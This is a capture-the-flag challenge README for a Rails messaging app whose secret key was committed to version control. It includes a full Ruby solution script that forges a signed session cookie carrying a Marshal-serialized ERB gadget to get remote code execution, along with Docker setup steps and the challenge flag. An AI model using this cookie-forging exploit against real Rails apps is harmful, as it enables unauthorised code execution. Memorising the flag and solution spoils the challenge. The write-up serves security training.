# Open Source Key Leak

It was (maybe still is?) common for Rails newbs and experts to check the config/secret_key.rb file into their version control system. We did this previously (https://github.com/mitre-cyber-academy/2013-web-400). The original challenge was vulnerable to a SQL injection -- this has been patched, but we are leaving the secret key the same. Usernames, passwords, and the key have also changed. By crafting a cookie using the secret key, competitors can take advantage of a remote code execution by passing a "legit" cookie, having it get un-serialized, and then the code contained in the cookie gets executed.


## Solution

Solution credit: http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/

    require "net/http"
    require "uri"
    require 'erb'
    require 'base64'
    require 'openssl'

    module ActiveSupport
      module Deprecation
        class DeprecatedInstanceVariableProxy
          def initialize(instance, method, var, deprecator)
            @instance = instance
            @method = method
            @var = var
            @deprecator = deprecator
          end
        end
      end
    end


    secret_token = 'c95f554820d160cac5792840a37900b98b30cd61f7dc7260a7532a8ffe15f46ddfd1e9005d648119a4f77d7f4221cb19ee6ef7d0bd4e08a42436502c212e9848'

    erb = ERB.allocate
    erb.instance_variable_set(:@src, 'thing = Message.first.body; system("echo #{thing} >> public/flag.txt");')

    proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "foo", ActiveSupport::Deprecation)
    my_evil_session_hash = {proxy => 'something'}

    # Serialize your hash
    marshal_dump = Marshal.dump(my_evil_session_hash)

    # Base64 encode this dump
    unescaped_cookie_value = Base64.encode64(marshal_dump).gsub("\n", "")

    # Escape any troublesome characters and remove line breaks altogether
    escaped_cookie_value = CGI.escape(unescaped_cookie_value).gsub("%0A", "")

    # Calculate the signature using the HMAC digest of the secret_token and the escaped cookie value. Replace %3D with equals signs.
    cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, escaped_cookie_value.gsub("%3D", "="))

    # Construct your evil cookie by concatenating the value with the signature
    my_evil_cookie = "_rails_messaging_app_session=#{unescaped_cookie_value}--#{cookie_signature}"

    # BOMBS AWAY
    url = URI.parse("http://localhost:80/") # Make sure you have a trailing / if you are sending to the root path

    req = Net::HTTP::Get.new(url.path)
    req.add_field("Cookie", my_evil_cookie)

    res = Net::HTTP.new(url.host, url.port).start do |http|
        http.request(req)
    end

    puts res.inspect


## Building/Running the Challenge
Step 1: Setting up

    git clone
    ...
    docker-compose up --build -d
    # Wait a minute...
    docker-compose run  --rm web /bin/bash -c "bundle exec rake db:create RAILS_ENV=production && bundle exec rake db:schema:load RAILS_ENV=production && bundle exec rake db:seed RAILS_ENV=production"

Step 2: change the docker-compose.yml ports to "3000:80"

Step 3: Take the above code and put it into a .rb file and run it

     change flag.txt to a name longer that 25 characters
     change url: from 80 to 3000

 Step 4: Go to the browser and type localhost:3000/longname.txt and see the key

**Competitors will also need to be informed that the file they create needs to have a name longer than 25 characters.**

This project uses the new format of the docker-compose file, which must be installed from https://github.com/docker/compose/releases and requires a version 1.7 or greater.

## Flag

763d661f088cbd9e83ed2d3f6c4865cca6f1d284